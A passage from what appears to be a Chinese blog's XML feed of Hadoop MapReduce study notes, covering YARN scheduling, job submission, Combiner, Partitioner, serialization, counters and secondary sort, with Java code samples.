IndexStepTwoReducer extends Reducer&lt;Text, Text, Text, Text&gt;&#123; @Override protected void reduce(Text key, Iterable&lt;Text&gt; values, Context context) throws IOException, InterruptedException &#123; StringBuffer sb = new StringBuffer(); for (Text text : values) &#123; sb.append(text.toString().replace("\t", "--&gt;") + "\t"); &#125; context.write(key, new Text(sb.toString())); &#125; &#125; public static void main(String[] args) throws Exception &#123; if (args.length &lt; 1 || args == null) &#123; args = new String[]&#123;"D:/temp/out/part-r-00000", "D:/temp/out2"&#125;; &#125; Configuration config = new Configuration(); Job job = Job.getInstance(config); job.setMapperClass(IndexStepTwoMapper.class); job.setReducerClass(IndexStepTwoReducer.class);// job.setMapOutputKeyClass(Text.class);// job.setMapOutputValueClass(Text.class); job.setOutputKeyClass(Text.class); job.setOutputValueClass(Text.class); FileInputFormat.setInputPaths(job, new Path(args[0])); FileOutputFormat.setOutputPath(job, new Path(args[1])); System.exit(job.waitForCompletion(true) ? 1:0); &#125;&#125; 13、Yarn1、Yarn图示简介 在Hadoop1.x时， 只有两个主要组件：hdfs（文件存储）， MapReduce（计算） 所有的计算相关的全部放在MapReduce上 JobTracker: 整个计算程序的老大 资源调度：随机调度 监控程序运行的状态，启动运行程序 存在单点故障问题 TaskTracker：负责计算程序的执行 强行的将计算资源分成2部分 MapSlot ReduceSlot 每一部分资源只能跑对应的任务 缺陷： 单点故障 资源调度随机，会造成资源浪费 JobTracker的运行压力过大 Hadoop2.x： 分理出Yarn，专门负责集群的资源管理和调度 Yarn的进程：ResourceManager: 整个资源调度的老大 接受hadoop客户端的请求 接受NodeManager 的状态报告， NM的资源状态和存活状态 资源调度，整个计算程序的资源调度，调度的运行资源和节点 内部组件： ASM——ApplicationsManager 所有应用程序的管理者，负责调度应用程序 Scheduler——调度器概念 调度的是什么时候执行哪个计算程序 调度器： FIFO: first in first out 先提交的先执行，后提交的后执行 内部维护一个队列 FAIR: 公平调度器 大家平分资源运行 假设刚开始只有一个任务，占资源100%，此时又来了一个任务，这是进行资源平分，每人50% 内部也是维护一个队列 CAPACITY: 可以按需进行配置，使用资源 内部可维护多个队列，多个队列之间可以进行资源分配 例如：分配两个队列 队列1：60% 队列2：40% 每个队列中都是执行FIFO的 NodeManager： 负责真正的提供资源，运行计算程序 接受ResourceManager的命令 提供资源运行计算程序 MRAppMaster: 单个计算程序的老大, 类似于项目经理 负责帮助当前计算程序向ResourceManager申请资源 负责启动 MapTask 和 ReduceTask 任务 Container: 抽象资源容器，封装这一定的cpu，io 和网络资源（逻辑概念） 是运行MapTask，ReduceTask等的运行资源单位 1个split —— 1个MapTask (ReduceTask) —— 1个Container —— 显示为YarnChild，底层运行的资源单位就是Container 2、Yarn运行过程 MRAppMaster会在所有的MapTask执行到0.8的时候，开启ReduceTask任务 YARN 作业执行流程: 用户向 YARN 中提交应用程序，其中包括 MRAppMaster 程序，启动 MRAppMaster 的命令， 用户程序等。 ResourceManager 为该程序分配第一个 Container，并与对应的 NodeManager 通讯，要求 它在这个 Container 中启动应用程序 MRAppMaster。 MRAppMaster 首先向 ResourceManager 注册，这样用户可以直接通过 ResourceManager 查看应用程序的运行状态，然后将为各个任务申请资源，并监控它的运行状态，直到运行结 束，重复 4 到 7 的步骤。 MRAppMaster 采用轮询的方式通过 RPC 协议向 ResourceManager 申请和领取资源。 一旦 MRAppMaster 申请到资源后，便与对应的 NodeManager 通讯，要求它启动任务。 NodeManager 为任务设置好运行环境(包括环境变量、JAR 包、二进制程序等)后，将 任务启动命令写到一个脚本中，并通过运行该脚本启动任务。 各个任务通过某个 RPC 协议向 MRAppMaster 汇报自己的状态和进度，以让 MRAppMaster 随时掌握各个任务的运行状态，从而可以在任务败的时候重新启动任务。 8、应用程序运行完成后，MRAppMaster 向 ResourceManager 注销并关闭自己。 3、Job的提交过程(待整理) 客户端向rm发送 提交job请求 rm向客户端发送 共享资源路径 和 applicationId 客户端将程序运行需要的共享资源放进共享资源路径包括：程序jar包，xml配置文件，split切片信息 客户端向rm发送资源放置成功的报告，并真正 提交应用程序 rm接收到客户端的请求，会返回一个空闲的资源节点(比如：node01) 到资源节点(node01)上启动container 启动MRAppMaster 创建作业簿 记录 maptask 和 reducetask 的 运行状态和进度 等信息 mrappmaster去共享资源路径下 ,获取 切片 和 配置文件 等信息 mrappmaster 向 rm 申请maptask 和 reducetask的资源 rm 在处理 mrappmaster 请求时，会 优先处理有关maptask的请求 rm 向 mrappmaster 返回空闲节点（数据本地优先原则），运行maptask 或 reducetask优先返回有数据的节点。 对象节点需要到hdfs 共享路径下下载程序jar包等 共享资源 到本地 mrappmaster 到 对应的节点上，启动container 和 maptask maptask需要向 mrappmaster 汇报自身的 运行状态和进度 mrappmaster 监控到所有的maptask 运行进度到 80%，启动reducetask（启动前，也会下载共享资源路径下的响应文件，程序jar包，配置文件等） reducetask 时刻和 mrappmaster 通信，汇报自身的 运行状态和进度 整个运行过程中，maptask运行完成 ， 都会向mrappmaster 申请注销 自己 当所有的maptask 和 reducetask 运行完成 ， mrappmaster 就会向rm 申请注销，进行资源回收 4.MapReduce&amp;yarn的工作机制–job提交流程–吸星大法 疑点: MRAppMaster 的数量问题 经过研究, 应该是每个 job 会产生一个 MRAppMaster 5.MapReduce全原理剖析—六脉神剑全图 细节图 6. maptask任务分配切片机制 7. 完整流程图 14. 关于 Driver 配置的注意点123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687import org.apache.hadoop.conf.Configuration;import org.apache.hadoop.fs.Path;import org.apache.hadoop.io.IntWritable;import org.apache.hadoop.io.Text;import org.apache.hadoop.mapreduce.Job;import org.apache.hadoop.mapreduce.lib.input.CombineTextInputFormat;import org.apache.hadoop.mapreduce.lib.input.FileInputFormat;import org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;/** * 相当于一个yarn集群的客户端 * 需要在此封装我们的mr程序的相关运行参数，指定jar包 * 最后提交给yarn * @author * */public class WordcountDriver &#123; public static void main(String[] args) throws Exception &#123; Configuration conf = new Configuration(); //是否运行为本地模式，就是看这个参数值是否为local，默认就是local /*conf.set("mapreduce.framework.name", "local");*/ //本地模式运行mr程序时，输入输出的数据可以在本地，也可以在hdfs上 //到底在哪里，就看以下两行配置你用哪行，默认就是file:/// /*conf.set("fs.defaultFS", "hdfs://mini1:9000/");*/ /*conf.set("fs.defaultFS", "file:///");*/ //运行集群模式，就是把程序提交到yarn中去运行 //要想运行为集群模式，以下3个参数要指定为集群上的值 /*conf.set("mapreduce.framework.name", "yarn"); conf.set("yarn.resourcemanager.hostname", "mini1"); conf.set("fs.defaultFS", "hdfs://mini1:9000/");*/ Job job = Job.getInstance(conf); job.setJar("c:/wc.jar"); //指定本程序的jar包所在的本地路径 /*job.setJarByClass(WordcountDriver.class);*/ //指定本业务job要使用的mapper/Reducer业务类 job.setMapperClass(WordcountMapper.class); job.setReducerClass(WordcountReducer.class); //指定mapper输出数据的kv类型 job.setMapOutputKeyClass(Text.class); job.setMapOutputValueClass(IntWritable.class); //指定最终输出的数据的kv类型 job.setOutputKeyClass(Text.class); job.setOutputValueClass(IntWritable.class); //指定需要使用combiner，以及用哪个类作为combiner的逻辑 /*job.setCombinerClass(WordcountCombiner.class);*/ job.setCombinerClass(WordcountReducer.class); //如果不设置InputFormat，它默认用的是TextInputformat.class job.setInputFormatClass(CombineTextInputFormat.class); CombineTextInputFormat.setMaxInputSplitSize(job, 4194304); CombineTextInputFormat.setMinInputSplitSize(job, 2097152); //指定job的输入原始文件所在目录 FileInputFormat.setInputPaths(job, new Path(args[0])); //指定job的输出结果所在目录 FileOutputFormat.setOutputPath(job, new Path(args[1])); // 指定需要缓存一个文件到所有的maptask运行节点工作目录 /* job.addArchiveToClassPath(archive); */// 缓存jar包到task运行节点的classpath中 /* job.addFileToClassPath(file); */// 缓存普通文件到task运行节点的classpath中 /* job.addCacheArchive(uri); */// 缓存压缩包文件到task运行节点的工作目录 /* job.addCacheFile(uri) */// 缓存普通文件到task运行节点的工作目录 // 将产品表文件缓存到task工作节点的工作目录中去 job.addCacheFile(new URI("file:/D:/srcdata/mapjoincache/pdts.txt")); //map端join的逻辑不需要reduce阶段，设置reducetask数量为0 job.setNumReduceTasks(0); //将job中配置的相关参数，以及job所用的java类所在的jar包，提交给yarn去运行 /*job.submit();*/ boolean res = job.waitForCompletion(true); System.exit(res?0:1); &#125;&#125; 15. GroupingComparator 分组排序见练习 或者github 注意点: 分区的数量 12345678910111213import org.apache.hadoop.io.NullWritable;import org.apache.hadoop.mapreduce.Partitioner;public class ItemIdPartitioner extends Partitioner&lt;OrderBean, NullWritable&gt;&#123; @Override public int getPartition(OrderBean bean, NullWritable value, int numReduceTasks) &#123; //相同id的订单bean，会发往相同的partition //而且，产生的分区数，是会跟用户设置的reduce task数保持一致 return (bean.getItemid().hashCode() &amp; Integer.MAX_VALUE) % numReduceTasks; &#125;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364import java.io.DataInput;import java.io.DataOutput;import java.io.IOException;import org.apache.hadoop.io.DoubleWritable;import org.apache.hadoop.io.Text;import org.apache.hadoop.io.WritableComparable;public class OrderBean implements WritableComparable&lt;OrderBean&gt;&#123; private Text itemid; private DoubleWritable amount; public OrderBean() &#123; &#125; public OrderBean(Text itemid, DoubleWritable amount) &#123; set(itemid, amount); &#125; public void set(Text itemid, DoubleWritable amount) &#123; this.itemid = itemid; this.amount = amount; &#125; public Text getItemid() &#123; return itemid; &#125; public DoubleWritable getAmount() &#123; return amount; &#125; @Override public int compareTo(OrderBean o) &#123; int cmp = this.itemid.compareTo(o.getItemid()); if (cmp == 0) &#123; cmp = -this.amount.compareTo(o.getAmount()); &#125; return cmp; &#125; @Override public void write(DataOutput out) throws IOException &#123; out.writeUTF(itemid.toString()); out.writeDouble(amount.get()); &#125; @Override public void readFields(DataInput in) throws IOException &#123; String readUTF = in.readUTF(); double readDouble = in.readDouble(); this.itemid = new Text(readUTF); this.amount= new DoubleWritable(readDouble); &#125; @Override public String toString() &#123; return itemid.toString() + "\t" + amount.get(); &#125;&#125; 1234567891011121314151617181920212223242526package cn.itcastcat.bigdata.secondarysort;import org.apache.hadoop.io.WritableComparable;import org.apache.hadoop.io.WritableComparator;/** * 利用reduce端的GroupingComparator来实现将一组bean看成相同的key * @author duanhaitao@itcast.cn * */public class ItemidGroupingComparator extends WritableComparator &#123; //传入作为key的bean的class类型，以及制定需要让框架做反射获取实例对象 protected ItemidGroupingComparator() &#123; super(OrderBean.class, true); &#125; @Override public int compare(WritableComparable a, WritableComparable b) &#123; OrderBean abean = (OrderBean) a; OrderBean bbean = (OrderBean) b; //比较两个bean时，指定只比较bean中的orderid return abean.getItemid().compareTo(bbean.getItemid( &#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081import java.io.IOException;import org.apache.commons.lang.StringUtils;import org.apache.hadoop.conf.Configuration;import org.apache.hadoop.fs.Path;import org.apache.hadoop.io.DoubleWritable;import org.apache.hadoop.io.LongWritable;import org.apache.hadoop.io.NullWritable;import org.apache.hadoop.io.Text;import org.apache.hadoop.mapreduce.Job;import org.apache.hadoop.mapreduce.Mapper;import org.apache.hadoop.mapreduce.Reducer;import org.apache.hadoop.mapreduce.lib.input.FileInputFormat;import org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;import com.sun.xml.bind.v2.schemagen.xmlschema.List;/** * * @author duanhaitao@itcast.cn * */public class SecondarySort &#123; static class SecondarySortMapper extends Mapper&lt;LongWritable, Text, OrderBean, NullWritable&gt;&#123; OrderBean bean = new OrderBean(); @Override protected void map(LongWritable key, Text value, Context context) throws IOException, InterruptedException &#123; String line = value.toString(); String[] fields = StringUtils.split(line, ","); bean.set(new Text(fields[0]), new DoubleWritable(Double.parseDouble(fields[2]))); context.write(bean, NullWritable.get()); &#125; &#125; static class SecondarySortReducer extends Reducer&lt;OrderBean, NullWritable, OrderBean, NullWritable&gt;&#123; //到达reduce时，相同id的所有bean已经被看成一组，且金额最大的那个一排在第一位 @Override protected void reduce(OrderBean key, Iterable&lt;NullWritable&gt; values, Context context) throws IOException, InterruptedException &#123; context.write(key, NullWritable.get()); &#125; &#125; public static void main(String[] args) throws Exception &#123; Configuration conf = new Configuration(); Job job = Job.getInstance(conf); job.setJarByClass(SecondarySort.class); job.setMapperClass(SecondarySortMapper.class); job.setReducerClass(SecondarySortReducer.class); job.setOutputKeyClass(OrderBean.class); job.setOutputValueClass(NullWritable.class); FileInputFormat.setInputPaths(job, new Path("c:/wordcount/gpinput")); FileOutputFormat.setOutputPath(job, new Path("c:/wordcount/gpoutput")); //在此设置自定义的Groupingcomparator类 job.setGroupingComparatorClass(ItemidGroupingComparator.class); //在此设置自定义的partitioner类 job.setPartitionerClass(ItemIdPartitioner.class); job.setNumReduceTasks(2); job.waitForCompletion(true); &#125;&#125;]]></content>
      <categories>
        <category>Hadoop</category>
        <category>MapReduce</category>
      </categories>
      <tags>
        <tag>原创</tag>
        <tag>技术</tag>
        <tag>Hadoop</tag>
        <tag>MapReduce</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MapReduce笔记-2 三大组件-Partitioner分区,sort排序,Combiner局部分区]]></title>
    <url>%2F2018%2F06%2F07%2FHadoop%2F2-MapReduce%2FMapReduce%E7%AC%94%E8%AE%B0-2%2F</url>
    <content type="text"><![CDATA[1. Combiner 组件1. 产生缘由：Combiner 是 MapReduce 程序中 Mapper 和 Reducer 之外的一种组件，它的作用是在 maptask 之后给 maptask 的结果进行局部汇总，以减轻 reducetask 的计算负载，减少网络传输 Combiner 组件的作用： 减少 reduce 端的数据量 减少 shuffle 过程的数据量 在 map 端做了一次合并，提高分布式计算程序的整体性能 Combiner 组件帮 reduce 分担压力， 因此其业务逻辑和 reduce 中的业务逻辑相似 2.自定义 Combiner 组件：默认情况下没有 Combiner 组件，Combiner 作用时间点 — map–combiner–reduce 继承 Reduce 类 public class MyCombiner extends Reducer&lt;前两个： map 的输出， 后两个： reduce 的输入&gt;{} 我们在写 MapReduce 程序的时候， map 的输出就是 reduce 的输入 也就是说， 这个 MyCombiner() 的前两个泛型和后两个泛型的类型一致 重写 reduce 方法 Combiner 本质上相当于 在 map 端进行了一次 reduce 操作， 通常情况下直接使用 reducer 的类作为 Combiner 的类，不再单独写 Combiner 代码逻辑 在 Job 中加上job.setCombinerClass(WorldcountReduce.class)， 就会调用 Combiner Combiner 使用原则 有或没有都不能影响业务逻辑，都不能影响最终结果。比如累加，最大值等，求平均值就不能用。 2、MapReduce 中的序列化2.1、概述Java 的序列化是一个重量级序列化框架（Serializable），一个对象被序列化后，会附带很多额 外的信息（各种校验信息，header，继承体系等），不便于在网络中高效传输； Hadoop 自己开发了一套序列化机制（参与序列化的对象的类都要实现 Writable 接口），精简，高效 Java 基本类型 &amp; Hadoop 类型对照表123456789101112131415161718// Java &amp; Hadoop类型参照hadoop数据类型 &lt;------------&gt; java数据类型: 布尔型： BooleanWritable &lt;------------&gt; boolean 整型： ByteWritable &lt;------------&gt; byte ShortWritable &lt;------------&gt; short IntWritable &lt;------------&gt; int LongWritable &lt;------------&gt; long 浮点型： FloatWritable &lt;------------&gt; float DoubleWritable &lt;------------&gt; double 字符串（文本）： Text &lt;------------&gt; String 数组： ArrayWritable &lt;------------&gt; Array map集合： MapWritable &lt;------------&gt; map 2.2、自定义对象实现 MapReduce 框架的序列化要实现WritableComparable接口，因为 MapReduce 框架中的 shuffle 过程一定会对 key 进行排序 123456789101112131415161718//序列化方法@Overridepublic void write(DataOutput out) throws IOException &#123; out.writeUTF(phone); out.writeLong(upfFlow); out.writeLong(downFlow); out.writeLong(sumFlow);&#125;//反序列化方法//注意： 字段的反序列化顺序与序列化时的顺序保持一致,並且类型也一致@Overridepublic void readFields(DataInput in) throws IOException &#123; this.phone = in.readUTF(); this.upfFlow = in.readLong(); this.downFlow = in.readLong(); this.sumFlow = in.readLong();&#125; 3. MapReduce中的Sort –TODO。。MapTask –&gt; ReduceTask 之间， 框架默认添加了排序 排序的规则是按照Map 端输出的 key 的字典顺序进行排序 1、 如果没有重写 WritableComparable 时 按单词统计中词频出现的此处进行排序， 按照出现的次数， 从低到高 如果想要对词频进行排序， 那么词频应该放在 map 输出 key 的位置 代码实现： 1234567 Map //词频为 key， 其它为 value Reduce // 将 map 输入的结果反转(k,v 换位置), 输出最终结果// 最后输出还是按照左边词, 右边次数// ps： 如果倒序排的时候, map 的时候发的时候 加上-, reduce 发的时候, 再加上-, 转成 IntWritable 2、自定义排序要实现WritableComparable接口 自定义的类必须放在 key 的位置 实现WritableComparable接口， 重写 compareTo()方法 待扩展… 作业： 增强需求： 按照总流量排序， 总流量相同时， 按照手机号码排序 4、MapReduce 中的数据分发组件 Partitioner（分区）需求： 根据归属地输出流量统计数据结果到不同文件，以便于在查询统计结果时可以定位到 省级范围进行 思路：MapReduce 中会将 map 输出的 kv 对，按照相同 key 分组，然后分发给不同的 reducetask 执行时机: 在Map输出 kv 对之后, 所携带的 k,v 参数，跟 Map 输出相同 MapReduce 默认的分发规则为：根据 key 的 hashcode%reducetask 数来分发，所以：如果要按照我们自 己的需求进行分组，则需要改写数据分发（分区）组件 Partitioner Partition重点总结： Partition 的 key value, 就是Mapper输出的key value public abstract int getPartition(KEY key, VALUE value, int numPartitions); 输入是Map的结果对&lt;key, value&gt;和Reducer的数目，输出则是分配的Reducer（整数编号）。就是指定Mappr输出的键值对到哪一个reducer上去。系统缺省的Partitioner是HashPartitioner，它以key的Hash值对Reducer的数目取模，得到对应的Reducer。这样保证如果有相同的key值，肯定被分配到同一个reducre上。如果有N个reducer，编号就为0,1,2,3……(N-1)。 MapReduce 中会将 map 输出的 kv 对，按照相同 key 分组，然后分发给不同的 reducetask 默认的分发规则为:根据 key 的 hashcode%reducetask 数来分发，所以:如果要按照我们自 己的需求进行分组，则需要改写数据分发(分组)组件 Partitioner, 自定义一个 CustomPartitioner 继承抽象类:Partitioner 因此， Partitioner 的执行时机， 是在Map输出 kv 对之后 Partitioner 实现过程 先分析一下具体的业务逻辑，确定大概有多少个分区 首先书写一个类，它要继承 org.apache.hadoop.mapreduce.Partitioner这个抽象类 重写public int getPartition这个方法，根据具体逻辑，读数据库或者配置返回相同的数字 在main方法中设置Partioner的类，job.setPartitionerClass(DataPartitioner.class); 设置Reducer的数量，job.setNumReduceTasks(6); 典型的 Partitioner 代码实现12345678910111213141516171819202122import java.util.HashMap;import org.apache.hadoop.io.Text;import org.apache.hadoop.mapreduce.Partitioner;public class ProvincePartitioner extends Partitioner&lt;Text, FlowBean&gt; &#123; private static HashMap&lt;String, Integer&gt; provincMap = new HashMap&lt;String, Integer&gt;(); static &#123; provincMap.put("138", 0); provincMap.put("139", 1); provincMap.put("136", 2); provincMap.put("137", 3); provincMap.put("135", 4); &#125; @Override public int getPartition(Text key, FlowBean value, int numPartitions) &#123; Integer code = provincMap.get(key.toString().substring(0, 3)); if (code != null) &#123; return code; &#125; return 5; &#125;&#125; 5、全局计数器1. 框架内置计数器： Hadoop内置的计数器，主要用来记录作业的执行情况 内置计数器包括 MapReduce框架计数器（Map-Reduce Framework） 文件系统计数器（FielSystemCounters） 作业计数器（Job Counters） 文件输入格式计数器（File Output Format Counters） 文件输出格式计数器（File Input Format Counters) 计数器由相关的task进行维护，定期传递给tasktracker，再由tasktracker传给jobtracker； 最终的作业计数器实际上是有jobtracker维护，所以计数器可以被全局汇总，同时也不必在整个网络中传递 只有当一个作业执行成功后，最终的计数器的值才是完整可靠的； 2. 自定义的计数器应用场景 用来统计运行过程中的进度和状态， 类似于 job 运行的一个报告、日志 要将数据处理过程中遇到的不合规数据行进行全局计数，类似这 种需求可以借助 MapReduce 框架中提供的全局计数器来实现 计数器的值可以在mapper或reducer中增加 使用方式 定义枚举类 1234enum Temperature&#123; MISSING, TOTAL &#125; 在map或者reduce中使用计数器 123456// 1.自定义计数器Counter counter = context.getCounter(Temperature.TOTAL); // 2.为计数器赋初始值counter.setValue(long value);// 3.计数器工作counter.increment(long incr); 获取计数器 123Counters counters=job.getCounters(); Counter counter=counters.findCounter(LOG_PROCESSOR_COUNTER.BAD_RECORDS_LONG);// 查找枚举计数器，假如Enum的变量为BAD_RECORDS_LONG long value=counter.getValue();//获取计数值 计数器使用完整代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162/** * @Description 假如一个文件，规范的格式是3个字段，“\t”作为分隔符，其中有2条异常数据，一条数据是只有2个字段，一条数据是有4个字段*/public class MyCounter &#123; // \t键 private static String TAB_SEPARATOR = "\t"; public static class MyCounterMap extends Mapper&lt;LongWritable, Text, Text, Text&gt; &#123; // 定义枚举对象 public static enum LOG_PROCESSOR_COUNTER &#123; BAD_RECORDS_LONG, BAD_RECORDS_SHORT &#125;; protected void map(LongWritable key, Text value, Context context) throws IOException, InterruptedException &#123; String arr_value[] = value.toString().split(TAB_SEPARATOR); if (arr_value.length &gt; 3) &#123; /* 自定义计数器 */ context.getCounter("ErrorCounter", "toolong").increment(1); /* 枚举计数器 */ context.getCounter(LOG_PROCESSOR_COUNTER.BAD_RECORDS_LONG).increment(1); &#125; else if (arr_value.length &lt; 3) &#123; // 自定义计数器 context.getCounter("ErrorCounter", "tooshort").increment(1); // 枚举计数器 context.getCounter(LOG_PROCESSOR_COUNTER.BAD_RECORDS_SHORT).increment(1); &#125; &#125; &#125; @SuppressWarnings("deprecation") public static void main(String[] args) throws IOException, InterruptedException, ClassNotFoundException &#123; String[] args0 = &#123; "hdfs://hadoop2:9000/buaa/counter/counter.txt", "hdfs://hadoop2:9000/buaa/counter/out/" &#125;; // 读取配置文件 Configuration conf = new Configuration(); // 如果输出目录存在，则删除 Path mypath = new Path(args0[1]); FileSystem hdfs = mypath.getFileSystem(conf); if (hdfs.isDirectory(mypath)) &#123; hdfs.delete(mypath, true); &#125; // 新建一个任务 Job job = new Job(conf, "MyCounter"); // 主类 job.setJarByClass(MyCounter.class); // Mapper job.setMapperClass(MyCounterMap.class); // 输入目录 FileInputFormat.addInputPath(job, new Path(args0[0])); // 输出目录 FileOutputFormat.setOutputPath(job, new Path(args0[1])); // 提交任务，并退出 System.exit(job.waitForCompletion(true) ? 0 : 1); &#125;&#125; 注意点：在没有 ReduceTask 的时候， job.setNumReduceTasks(0); 关于计数器，详情可参考]]></content>
      <categories>
        <category>Hadoop</category>
        <category>MapReduce</category>
      </categories>
      <tags>
        <tag>原创</tag>
        <tag>技术</tag>
        <tag>Hadoop</tag>
        <tag>MapReduce</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MapReduce笔记-1 WordCount, MapReduce运行机制]]></title>
    <url>%2F2018%2F06%2F06%2FHadoop%2F2-MapReduce%2FMapReduce%E7%AC%94%E8%AE%B0-1%2F</url>
    <content type="text"><![CDATA[参考链接: hdfs 笔记 mapreduce 笔记 1、MapReduce 入门1.1、MapReduce概念hadoop 的四大组件： HDFS：分布式存储系统 MapReduce：分布式计算系统 YARN：hadoop 的资源调度系统 Common：以上三大组件的底层支撑组件，主要提供基础工具包和 RPC 框架等 MapReduce 是一个分布式运算程序的编程框架，是用户开发“基于 Hadoop 的数据分析应用” 的核心框架 MapReduce 核心功能 ：将用户编写的业务逻辑代码和自带默认组件整合成一个完整的分布 式运算程序，并发运行在一个 Hadoop 集群上 1.2、为什么需要 MapReduce？引入 MapReduce 框架后，开发人员可以将绝大部分工作集中在业务逻辑的开发上，而将 分布式计算中的复杂性交由框架来处理 Hadoop 当中的 MapReduce 分布式程序运算框架的整体结构如下： MRAppMaster：MapReduce Application Master，分配任务，协调任务的运行 MapTask：阶段并发任，负责 mapper 阶段的任务处理 YARNChild ReduceTask：阶段汇总任务，负责 reducer 阶段的任务处理 YARNChild 1.3、MapReduce 的编写规范MapReduce 程序编写规范： 用户编写的程序分成三个部分：Mapper，Reducer，Driver(提交运行 MR 程序的客户端) Mapper 的输入数据是 KV 对的形式（KV 的类型可自定义） Mapper 的输出数据是 KV 对的形式（KV 的类型可自定义） Mapper 中的业务逻辑写在 map()方法中 map()方法（maptask 进程）对每一个&lt;K,V&gt;调用一次 Reducer 的输入数据类型对应 Mapper 的输出数据类型，也是 KV 对的形式 Reducer 的业务逻辑写在 reduce()方法中 Reducetask 进程对每一组相同 k 的&lt;K,V&gt;组调用一次 reduce()方法 用户自定义的 Mapper 和 Reducer 都要继承各自的父类 整个程序需要一个 Drvier 来进行提交，提交的是一个描述了各种必要信息的 job 对象 1.4、WordCount 程序1、业务逻辑 maptask阶段处理每个数据分块的单词统计分析，思路是每遇到一个单词则把其转换成一个 key-value对，比如单词 hello，就转换成&lt;’hello’,1&gt;发送给 reducetask去汇总 reducetask阶段将接受 maptask的结果，来做汇总计数 2、具体代码实现1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465 Map static class WordCountMapper extends Mapper&lt;LongWritable, Text, Text, IntWritable&gt; &#123; @Override protected void map(LongWritable key, Text value, Context context) throws IOException, InterruptedException &#123; // 计算任务代码：切割单词，输出每个单词计 1 的 key-value 对 String[] words = value.toString().split(" "); for (String word : words) &#123; context.write(new Text(word), new IntWritable(1)); &#125; &#125;&#125; Reduce static class WordCountReducer extends Reducer&lt;Text, IntWritable, Text, IntWritable&gt; &#123; @Override protected void reduce(Text key, Iterable&lt;IntWritable&gt; values, Context context) throws IOException, InterruptedException &#123; // 汇总计算代码：对每个 key 相同的一组 key-value 做汇总统计 int sum = 0; for (IntWritable v : values) &#123; sum += v.get(); &#125; context.write(key, new IntWritable(sum)); &#125;&#125; main public static void main(String[] args) throws Exception &#123; // 指定 hdfs 相关的参数 Configuration conf = new Configuration(); conf.set("fs.defaultFS", "hdfs://hadoop02:9000"); System.setProperty("HADOOP_USER_NAME", "hadoop"); // 新建一个 job 任务 Job job = Job.getInstance(conf); // 设置 jar 包所在路径 job.setJarByClass(WordCountMR.class); // 指定 mapper 类和 reducer 类 job.setMapperClass(WordCountMapper.class); job.setReducerClass(WordCountReducer.class); // 指定 maptask 的输出类型 job.setMapOutputKeyClass(Text.class); job.setMapOutputValueClass(IntWritable.class); // 指定 reducetask 的输出类型 job.setOutputKeyClass(Text.class); job.setOutputValueClass(IntWritable.class); // 指定该 mapreduce 程序数据的输入和输出路径 Path inputPath = new Path("/wordcount/input"); Path outputPath = new Path("/wordcount/output"); FileInputFormat.setInputPaths(job, inputPath); FileOutputFormat.setOutputPath(job, outputPath); // 最后提交任务 boolean waitForCompletion = job.waitForCompletion(true); System.exit(waitForCompletion?0:1);&#125; 1.5 小文件优化 需要设置最大值和最小值, 会切分文件, 在最大值与最小值之间 2、MapReduce 程序的核心运行机制2.1、概述一个完整的 MapReduce 程序在分布式运行时有两类实例进程： MRAppMaster：负责整个程序的过程调度及状态协调 Yarnchild：负责 map 阶段的整个数据处理流程 Yarnchild：负责 reduce 阶段的整个数据处理流程 以上两个阶段 MapTask 和 ReduceTask 的进程都是 YarnChild ， 并不是说这 MapTask 和 ReduceTask 就跑在同一个 YarnChild 进行里 2.2、MapReduce 程序的运行流程 一个 mr 程序启动的时候，最先启动的是 MRAppMaster，MRAppMaster 启动后根据本次 job 的描述信息，计算出需要的 maptask 实例数量，然后向集群申请机器启动相应数量的 maptask 进程 maptask 进程启动之后，根据给定的数据切片(哪个文件的哪个偏移量范围)范围进行数 据处理，主体流程为： 利用客户指定的 InputFormat 来获取 RecordReader 读取数据，形成输入 KV 对 将输入 KV 对传递给客户定义的 map()方法，做逻辑运算，并将 map()方法输出的 KV 对收 集到缓存 将缓存中的 KV 对按照 K 分区排序后不断溢写到磁盘文件 MRAppMaster 监控到所有 maptask 进程任务完成之后（真实情况是，某些 maptask 进 程处理完成后，就会开始启动 reducetask 去已完成的 maptask 处 fetch 数据），会根据客户指 定的参数启动相应数量的 reducetask 进程，并告知 reducetask 进程要处理的数据范围（数据 分区） Reducetask 进程启动之后，根据 MRAppMaster 告知的待处理数据所在位置，从若干台 maptask 运行所在机器上获取到若干个 maptask 输出结果文件，并在本地进行重新归并排序， 然后按照相同 key 的 KV 为一个组，调用客户定义的 reduce()方法进行逻辑运算，并收集运 算输出的结果 KV，然后调用客户指定的 OutputFormat 将结果数据输出到外部存储 2.3、MapTask 并行度决定机制将待处理数据执行逻辑切片（即按照一个特定切片大小，将待处理数据划分成逻辑上的多 个 split），然后每一个 split 分配一个 mapTask 并行实例处理。 这段逻辑及形成的切片规划描述文件，是由 FileInputFormat 实现类的 getSplits()方法完成的。 该方法返回的是 List，InputSplit 封装了每一个逻辑切片的信息，包括长度和位置 信息，而 getSplits()方法返回一组 InputSplit。 2.4、切片机制 FileInputFormat 中默认的切片机制 简单地按照文件的内容长度进行切片 切片大小，默认等于 block 大小 切片时不考虑数据集整体，而是逐个针对每一个文件单独切片 比如待处理数据有两个文件： File1.txt 200M File2.txt 100M 经过 getSplits()方法处理之后，形成的切片信息是： File1.txt-split1 0-128M File1.txt-split2 129M-200M File2.txt-split1 0-100M FileInputFormat 中切片的大小的参数配置1234567891011// 通过分析源码，在 FileInputFormat 中，计算切片大小的逻辑：long splitSize = computeSplitSize(blockSize, minSize, maxSize)，翻译一下就是求这三个值的中 间值// 切片主要由这几个值来运算决定：blocksize：默认是 128M，可通过 dfs.blocksize 修改minSize：默认是 1，可通过 mapreduce.input.fileinputformat.split.minsize 修改maxsize：默认是 Long.MaxValue，可通过 mapreduce.input.fileinputformat.split.maxsize 修改//因此，如果 maxsize 调的比 blocksize 小，则切片会小于 blocksize; 如果 minsize 调的比 blocksize 大，则切片会大于 blocksize// 但是，不论怎么调参数，都不能让多个小文件“划入”一个 split 2.5、MapTask 并行度经验之谈如果硬件配置为 2*12core + 64G，恰当的 map 